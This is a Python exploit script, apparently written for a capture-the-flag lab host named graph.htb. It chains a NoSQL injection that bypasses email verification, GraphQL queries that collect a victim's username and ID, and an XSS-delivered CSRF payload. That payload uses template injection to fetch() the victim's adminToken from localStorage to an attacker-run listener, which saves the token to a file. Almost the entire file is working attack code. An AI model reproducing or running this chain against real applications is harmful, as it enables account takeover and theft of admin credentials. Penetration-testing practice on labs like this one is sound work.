#!/usr/bin/env python3

import argparse
import traceback
import requests
import http.server
import socketserver
import threading
import time
import sys
import os
import signal
from urllib.parse import urlparse, parse_qs


"""

Example usage: /usr/bin/python3 exfilAdminToken.py --lhost 10.10.16.6

"""


# Global variables
admin_token_received = False
server_running = False

class TokenHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress default logging to keep output clean
        pass
    
    def do_GET(self):
        global admin_token_received
        
        if self.path.startswith('/token?adminToken='):
            try:
                # Extract the admin token from the URL
                parsed_url = urlparse(self.path)
                query_params = parse_qs(parsed_url.query)
                admin_token = query_params.get('adminToken', [''])[0]
                
                if admin_token:
                    print(f"\n[+] Admin token received: {admin_token}")
                    
                    # Save the token to a file for later use
                    with open("admin_token.txt", "w") as f:
                        f.write(admin_token)
                    
                    admin_token_received = True
                    
                    # Send a simple response
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(b'Token received successfully!')
                else:
                    print("[-] Empty admin token received")
                    self.send_error(400, "Empty token")
                    
            except Exception as e:
                print(f"[-] Error processing token: {e}")
                self.send_error(500, "Server error")
        else:
            # Serve files normally (including csrf.js)
            super().do_GET()

def start_http_server(port=80, timeout=300):
    """Start HTTP server with timeout"""
    global server_running
    
    try:
        with socketserver.TCPServer(("", port), TokenHandler) as httpd:
            server_running = True
            print(f"[+] HTTP Server started on port {port}")
            print(f"[+] Waiting for admin token (timeout: {timeout}s)...")
            
            # Set socket timeout
            httpd.timeout = 1
            start_time = time.time()
            
            while server_running and (time.time() - start_time) < timeout:
                httpd.handle_request()
                if admin_token_received:
                    print("[+] Token received, shutting down server")
                    break
                    
            if not admin_token_received:
                print(f"[-] Timeout reached ({timeout}s), no token received")
                
    except PermissionError:
        print(f"[-] Permission denied for port {port}. Try running as root/administrator")
        print("    Or use a higher port number (e.g., 8000)")
    except OSError as e:
        if e.errno == 98:  # Address already in use
            print(f"[-] Port {port} is already in use")
        else:
            print(f"[-] Error starting HTTP server: {e}")
    except Exception as e:
        print(f"[-] Unexpected server error: {e}")
    finally:
        server_running = False

def make_request(url, method="POST", headers=None, json_data=None, cookies=None, proxies=None, timeout=30):
    """Wrapper for making HTTP requests with better error handling"""
    try:
        if method.upper() == "POST":
            response = requests.post(url, headers=headers, json=json_data, 
                                    cookies=cookies, proxies=proxies, timeout=timeout)
        else:
            response = requests.get(url, headers=headers, cookies=cookies, 
                                    proxies=proxies, timeout=timeout)
        return response
    except requests.exceptions.Timeout:
        print(f"[-] Request timeout for {url}")
        return None
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error for {url}")
        return None
    except Exception as e:
        print(f"[-] Request error for {url}: {e}")
        return None

def create_account(proxy_config=None):
    """Request code for johndoe@graph.htb"""
    print("[*] Starting account creation process...")
    
    headers = {
        "Content-Type": "application/json", 
        "Origin": "http://internal.graph.htb", 
        "Referer": "http://internal.graph.htb/"
    }
    
    # Step 1: Request verification code
    req_code_url = "http://internal-api.graph.htb:80/api/code"
    req_code_json = {"email": "johndoe@graph.htb"}
    
    print("[*] Requesting verification code for johndoe@graph.htb")
    req_code = make_request(req_code_url, headers=headers, json_data=req_code_json, proxies=proxy_config)
    
    if not req_code or "4 digit code sent to your email" not in req_code.text:
        print("[-] Failed to request verification code")
        return None
    
    print("[+] Verification code requested successfully")
    
    # Step 2: Verify account using NoSQL injection
    vrfy_acc_url = "http://internal-api.graph.htb:80/api/verify"
    vrfy_acc_json = {"code": {"$ne": "00000"}, "email": "johndoe@graph.htb"}
    
    print("[*] Verifying account via NoSQL injection")
    req_vrfy = make_request(vrfy_acc_url, headers=headers, json_data=vrfy_acc_json, proxies=proxy_config)
    
    if not req_vrfy or "Email Verified" not in req_vrfy.text:
        print("[-] Failed to verify account")
        return None
    
    print("[+] Account verified successfully")
    
    # Step 3: Register account
    reg_usr_url = "http://internal-api.graph.htb:80/api/register"
    reg_usr_json = {
        "confirmPassword": "Meomeo!1234", 
        "email": "johndoe@graph.htb", 
        "password": "Meomeo!1234", 
        "username": "johndoe"
    }
    
    print("[*] Registering account")
    req_reg_usr = make_request(reg_usr_url, headers=headers, json_data=reg_usr_json, proxies=proxy_config)
    
    if not req_reg_usr or "Account Created Please Login!" not in req_reg_usr.text:
        print("[-] Failed to create account")
        return None
    
    print("[+] Account created successfully")
    
    # Step 4: Login
    login_url = "http://internal-api.graph.htb:80/graphql"
    login_json = {
        "query": "mutation ($email: String!, $password: String!) {\n  login(email: $email, password: $password) {\n    email\n    username\n    adminToken\n    id\n    admin\n    firstname\n    lastname\n    __typename\n  }\n}", 
        "variables": {"email": "johndoe@graph.htb", "password": "Meomeo!1234"}
    }
    
    print("[*] Logging in as johndoe@graph.htb")
    req_login = make_request(login_url, headers=headers, json_data=login_json, proxies=proxy_config)
    
    if not req_login or "johndoe@graph.htb" not in req_login.text or "UNAUTHENTICATED" in req_login.text:
        print("[-] Failed to login")
        return None
    
    auth_token = req_login.cookies.get('auth')
    if not auth_token:
        print("[-] No auth token received")
        return None
    
    print("[+] Login successful")
    print(f"[+] JohnDoe's Auth Token: {auth_token}")
    return auth_token

def exfil_admin_token(john_auth_token, lhost, proxy_config=None, server_port=80):
    """Exfiltrate admin token via CSRF attack"""
    print("[*] Starting admin token exfiltration...")
    
    headers = {
        "Content-Type": "application/json", 
        "Origin": "http://internal.graph.htb", 
        "Referer": "http://internal.graph.htb/"
    }
    cookies = {"auth": john_auth_token}
    
    # Get victim's username
    messages_url = "http://internal-api.graph.htb:80/graphql"
    messages_json = {
        "query": "{\n    Messages {\n        toUserName\n        fromUserName\n        text\n        to\n        from\n        __typename\n    }\n}", 
        "variables": {}
    }
    
    print("[*] Retrieving victim's username...")
    req_messages = make_request(messages_url, headers=headers, cookies=cookies, 
                                json_data=messages_json, proxies=proxy_config)
    
    if not req_messages or req_messages.status_code != 200:
        print("[-] Failed to retrieve messages")
        return False
    
    try:
        messages_body = req_messages.json()
        victim_username = messages_body["data"]["Messages"][0]["fromUserName"]
        victim_username_lower = victim_username.lower()
        print(f"[+] Victim username: {victim_username}")
    except (KeyError, IndexError, ValueError) as e:
        print(f"[-] Error parsing messages: {e}")
        return False
    
    # Get victim's account ID
    tasks_url = "http://internal-api.graph.htb:80/graphql"
    tasks_json = {
        "query": f"query tasks {{\n    tasks(username: \"{victim_username}\") {{\n        Assignedto\n        taskstatus\n        text\n        type\n        username\n    }}\n}}", 
        "variables": {}
    }
    
    print("[*] Retrieving victim's account ID...")
    req_tasks = make_request(tasks_url, headers=headers, json_data=tasks_json, proxies=proxy_config)
    
    if not req_tasks or "taskstatus" not in req_tasks.text:
        print("[-] Failed to retrieve tasks")
        return False
    
    try:
        tasks_body = req_tasks.json()
        victim_acc_id = tasks_body["data"]["tasks"][0]["Assignedto"]
        print(f"[+] Victim account ID: {victim_acc_id}")
    except (KeyError, IndexError, ValueError) as e:
        print(f"[-] Error parsing tasks: {e}")
        return False
    
    # Create CSRF payload
    js_content = f'''
var req = new XMLHttpRequest();
req.open('POST', 'http://internal-api.graph.htb/graphql', false);
req.setRequestHeader("Content-Type","text/plain");
req.withCredentials = true;
var body = JSON.stringify({{
    operationName: "update",
    variables: {{
        firstname: "{victim_username_lower}",
        lastname: "{{{{constructor.constructor('fetch(\\"http://{lhost}:{server_port}/token?adminToken=\\" + localStorage.getItem(\\"adminToken\\"))')()}}}}",
        id: "{victim_acc_id}",
        newusername: "{victim_username_lower}"
    }},
    query: "mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {{update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){{username,email,id,firstname,lastname,adminToken}}}}"
}});
req.send(body);
'''
    
    with open("csrf.js", "w", encoding="utf-8") as f:
        f.write(js_content)
    print("[+] CSRF payload written to csrf.js")
    
    # Start HTTP server
    server_thread = threading.Thread(target=start_http_server, args=(server_port, 300), daemon=True)
    server_thread.start()
    time.sleep(2)  # Give server time to start
    
    # Send malicious message
    csrf_url = "http://internal-api.graph.htb:80/graphql"
    csrf_json = {
        "query": "mutation ($to: String!, $text: String!) {\n  sendMessage(to: $to, text: $text) {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}", 
        "variables": {
            "text": f"http://graph.htb/?redirect=javascript:document.body.innerHTML%2B%3D'<script%20src%3d\"http://{lhost}:{server_port}/csrf.js\"></script>'", 
            "to": f"{victim_username_lower}@graph.htb"
        }
    }
    
    print("[*] Delivering CSRF attack...")
    req_csrf = make_request(csrf_url, headers=headers, cookies=cookies, 
                            json_data=csrf_json, proxies=proxy_config)
    
    if not req_csrf or "johndoe@graph.htb" not in req_csrf.text:
        print("[-] Failed to deliver CSRF attack")
        return False
    
    print("[+] CSRF attack delivered successfully!")
    print("[+] Waiting for admin token...")
    
    # Wait for token with timeout
    timeout = 300  # 5 minutes
    start_time = time.time()
    
    while time.time() - start_time < timeout and not admin_token_received:
        time.sleep(1)
    
    if admin_token_received:
        print("[+] Admin token successfully exfiltrated!")
        return True
    else:
        print("[-] Timeout waiting for admin token")
        return False

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global server_running
    print("\n[*] Shutting down...")
    server_running = False
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='Exfiltrate the adminToken')
    parser.add_argument('--lhost', help='Attacker IP address')
    parser.add_argument('--port', type=int, default=80, help='HTTP server port (default: 80)')
    parser.add_argument('--proxy', help='HTTP proxy (format: http://127.0.0.1:8080)')
    parser.add_argument('--no-proxy', action='store_true', help='Disable proxy')
    
    args = parser.parse_args()
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Configure proxy
    proxy_config = None
    if not args.no_proxy:
        if args.proxy:
            proxy_config = {"http": args.proxy, "https": args.proxy}
        else:
            proxy_config = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}
    
    print(f"[*] Starting exploit")
    print(f"[*] Attacker server host: {args.lhost}")
    print(f"[*] Attacker Server port: {args.port}")
    print(f"[*] Proxy: {proxy_config}")
    
    try:
        # Step 1: Create account and get auth token
        john_auth_token = create_account(proxy_config)
        if not john_auth_token:
            print("[-] Failed to create account. Exiting.")
            return 1
        
        # Step 2: Exfiltrate admin token
        success = exfil_admin_token(john_auth_token, args.lhost, proxy_config, args.port)
        
        if success:
            print("[+] Exploit completed successfully!")
            if os.path.exists("admin_token.txt"):
                with open("admin_token.txt", "r", encoding="utf-8") as f:
                    token = f.read().strip()
                    print(f"[+] Admin token saved to admin_token.txt: {token}")
            return 0
        else:
            print("[-] Exploit failed")
            return 1
            
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())
